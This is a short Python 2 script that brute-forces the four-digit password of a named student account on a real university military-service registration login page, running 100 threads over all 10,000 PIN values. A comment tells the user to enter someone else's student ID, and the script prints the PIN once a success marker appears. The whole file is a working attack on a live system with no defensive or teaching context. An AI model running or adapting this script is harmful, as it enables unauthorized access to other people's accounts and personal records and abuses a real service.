# coding=utf-8
# https://military.nctu.edu.tw/index.php
# 兵役登錄系統

import requests
import threading
import sys
#定義編碼
reload(sys)
sys.setdefaultencoding('utf-8')

def brute(L, H):
  #傳送post給目標網址
  for i in range(L, H):
    r = requests.post('https://military.nctu.edu.tw/index.php',
    data = {
      'username': '0616231',   #填別人學號
      'password': str(i).zfill(4),
      'sbmOK': '%B0e%A5X'
    })
    text = r.content.decode('big5')
    #確認是否成功登入
    if '原因' in text:
      print(i)
      exit(0)


#開threads讓速度更快
threads = 100
for i in range(threads):
  block = 100
  t = threading.Thread(target = brute, args = (block * i, block * (i+ 1)))
  t.start()